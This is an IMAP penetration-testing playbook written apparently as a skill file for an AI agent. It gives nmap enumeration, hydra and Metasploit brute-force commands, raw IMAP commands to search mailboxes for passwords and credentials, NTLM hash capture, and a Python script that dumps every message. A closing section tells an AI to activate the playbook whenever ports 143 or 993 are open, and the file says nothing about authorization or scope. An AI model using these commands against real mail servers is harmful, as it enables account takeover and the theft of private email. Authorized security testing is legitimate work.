# IMAP Pentesting Skill

## Goal

Identify and exploit vulnerabilities in IMAP email services on port 143/993.

## Port

- **143** - IMAP (plaintext)
- **993** - IMAPS (SSL/TLS)

## Methodology

1. **Identify IMAP Service:** Scan for ports 143 and 993
2. **Enumerate Capabilities:** Check supported features
3. **Brute Force:** Attack weak credentials
4. **Access Mailbox:** Read and manipulate emails
5. **Extract Intelligence:** Gather sensitive data from emails

## Enumeration

```bash
# Nmap scan
nmap -sV -p 143,993 <target>

# Check capabilities
nmap -p 143 --script imap-capabilities <target>

# Banner grabbing
nc <target> 143
openssl s_client -connect <target>:993
```

## IMAP Commands

```bash
# Connect
nc <target> 143

# Authenticate
A1 LOGIN <username> <password>

# List mailboxes
A2 LIST "" "*"

# Select mailbox
A3 SELECT INBOX

# List emails
A4 SEARCH ALL
A4 SEARCH UNSEEN

# Fetch email
A5 FETCH 1 BODY[]
A5 FETCH 1:10 (BODY[HEADER])

# Logout
A6 LOGOUT
```

## Capability Check

```bash
# Check for STARTTLS, AUTH methods
A1 CAPABILITY
# Response: * CAPABILITY IMAP4rev1 STARTTLS AUTH=PLAIN AUTH=NTLM ...
```

## Brute Force

```bash
# Using hydra
hydra -l admin -P passwords.txt imap://<target>
hydra -L users.txt -P passwords.txt imaps://<target>:993

# Using nmap
nmap -p 143 --script imap-brute <target>

# Metasploit
use auxiliary/scanner/imap/imap_login
```

## Mailbox Enumeration

```bash
# List all folders
A1 LIST "" "*"
# Returns: * LIST (\HasNoChildren) "/" INBOX
#          * LIST (\HasNoChildren) "/" Sent
#          * LIST (\HasNoChildren) "/" Drafts

# Get mailbox status
A2 STATUS INBOX (MESSAGES UNSEEN)
```

## Email Search and Extraction

```bash
# Search for specific content
A1 SEARCH BODY "password"
A1 SEARCH FROM "admin@company.com"
A1 SEARCH SUBJECT "credentials"

# Fetch specific email
A2 FETCH 5 (BODY[TEXT])
A2 FETCH 5 (ENVELOPE)

# Fetch all email headers
A3 FETCH 1:* (BODY[HEADER.FIELDS (FROM TO SUBJECT DATE)])
```

## NTLM Hash Capture

```bash
# Check for NTLM auth
nmap -p 143 --script imap-ntlm-info <target>

# Capture NTLM hashes with Responder
```

## Python Automation

```python
import imaplib

mail = imaplib.IMAP4('<target>')
mail.login('<username>', '<password>')

mail.select('INBOX')
result, data = mail.search(None, 'ALL')

for num in data[0].split():
    result, msg = mail.fetch(num, '(RFC822)')
    print(msg[0][1])
```

## Tools

* **Telnet/OpenSSL** - Manual interaction
* **Hydra** - Brute force attacks
* **Nmap** - Service enumeration
* **Python imaplib** - Programmatic access

## Guidance for AI

* Activate when port 143 or 993 is open
* IMAP4rev1 is the current standard
* Unlike POP3, IMAP keeps emails on server
* Search function is powerful for finding specific content
* NTLM auth can be exploited for hash capture
* Check all folders, not just INBOX
